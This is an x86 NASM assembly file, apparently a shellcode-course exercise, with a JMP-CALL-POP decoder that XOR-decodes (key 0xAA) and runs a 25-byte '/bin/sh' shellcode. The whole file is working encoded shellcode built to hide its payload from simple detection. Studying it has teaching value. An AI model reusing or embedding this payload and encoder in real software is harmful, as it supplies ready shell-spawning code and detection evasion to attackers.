; Executable name : xor_01_decoder_loop
; Version         : 1.0
; Created date    : 07/03/2020
; Last update     : 07/03/2020
; Author          : bigb0ss
; Description     : 1) This is to run XOR decode "/bin/sh" shellcode
;                   2) This will leverage a technique called JMP-CALL-POP to read decoded "/bin/sh" from the stack. 
;

global _start

section .text

_start:

        jmp short call_decoder        ; JMP to "call_decoder" 

decoder:

        pop esi                       ; POPing "shellcode" on the ESI register 
        xor ecx, ecx                  ; Zero out ECX
        mov cl, 25                    ; Moving 25 (Lenght of the "shellcode") to C low
      
decode_loop:

        xor byte [esi], 0xAA          ; XORing wiht Key (= 0xAA)
        inc esi                       ; Increase ESI by one
        loop decode_loop              ; Looping "decode_loop" for 25 time
        jmp short shellcode           ; JMP to the decoded  "shellcode"

call_decoder:

      call decoder                    ; CALL "decoder"
      shellcode: db 0x9b, 0x6a, 0xfa, 0xc2, 0x85, 0x85, 0xd9, 0xc2, 0xc2, 0x85, 0xc8, 0xc3, 0xc4, 0x23, 0x49, 0xfa, 0x23, 0x48, 0xf9, 0x23, 0x4b, 0x1a, 0xa1, 0x67, 0x2a
